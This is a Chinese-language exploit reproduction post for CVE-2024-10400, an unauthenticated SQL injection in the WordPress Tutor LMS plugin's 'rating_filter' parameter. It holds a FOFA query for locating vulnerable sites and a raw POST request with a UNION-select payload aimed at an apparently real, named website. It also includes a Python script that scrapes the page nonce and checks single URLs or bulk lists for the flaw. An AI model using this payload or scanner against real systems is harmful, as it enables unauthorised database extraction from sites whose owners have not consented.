# WordPress插件Tutor_LMS存在SQL注入漏洞复现(CVE-2024-10400)

WordPress 的 Tutor LMS 插件在 2.7.6 及 2.7.6 之前的所有版本中存在通过 “rating_filter ”参数进行 SQL 注入的漏洞，原因是用户提供的参数未进行充分的转义处理，而且现有的 SQL 查询也未进行预编译。这使得未经认证的攻击者有可能在已有的查询中附加额外的 SQL 查询，从而从数据库中提取敏感信息。

## fofa
```javascript
body="/wp-content/plugins/tutor/"
```

## poc
```javascript
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: academy.keune.ch
Content-Type: application/x-www-form-urlencoded

action=load_filtered_instructor&_tutor_nonce=56803fc221&rating_filter=1e0+and+1=0+Union+select+1,2,3,4,5,6,7,8,9,concat(0x7e,user(),0x7e),11,12,14--+-
```

访问网站查看源码，获取_tutor_nonce的参数

![image-20241227220244898](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272202950.png)

![image-20241227220301165](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272203238.png)

## python脚本

```python
import requests
import urllib3
from urllib.parse import urljoin
import argparse
import ssl
import re

ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()
        
def check_sql_injection(url):
    target_url = url.rstrip("/")
    target_url_tutor_nonce = urljoin(target_url, "")
    print(target_url_tutor_nonce)
    target_endpoint = urljoin(target_url, "/wp-admin/admin-ajax.php")

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",  
        "Content-Type": "application/x-www-form-urlencoded"
    }

    tutor_nonce = None

    try:
        response = requests.get(target_url_tutor_nonce, verify=False, headers=headers, timeout=15)
        
        match = re.search(r'"_tutor_nonce":"(\w+)"', response.text)
        if match:
            tutor_nonce = match.group(1)
            print(f"\033[32mFound_tutor_nonce: {tutor_nonce}\033[0m")
            
        if tutor_nonce:
            payloads = f"action=load_filtered_instructor&_tutor_nonce={tutor_nonce}&rating_filter=1e0+and+1=0+Union+select+111,2222,3333,4,5,6,7,8,9,concat(md5(123321),version()),11,12,14--+-"
            
            
            response = requests.post(target_endpoint, verify=False, headers=headers, timeout=15, data=payloads)
            if response.status_code == 200 and all(key in response.text for key in ['c8837b23ff8aaa8a2dde915473ce099110']):
                print(f"\033[31mFind: {url}: WordPress_CVE-2024-10400_sql_Injection!\033[0m")
                return True

    except requests.RequestException as e:
        print(f"Error checking {url}: {e}")

    return False

def main():
    parser = argparse.ArgumentParser(description="Check for SQL injection vulnerabilities.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target URL")
    group.add_argument("-f", "--file", help="File containing URLs")

    args = parser.parse_args()

    if args.url:
        check_sql_injection(args.url)
    elif args.file:
        urls = read_file(args.file)
        for url in urls:
            check_sql_injection(url)

if __name__ == "__main__":
    main()
```

## 漏洞来源

- https://github.com/iSee857/CVE-PoC/blob/d6dc0f2baa9e65ae8d277f9e67086dc2f4bd72ac/WordPress_CVE-2024-10400_sql_Injection.py#L42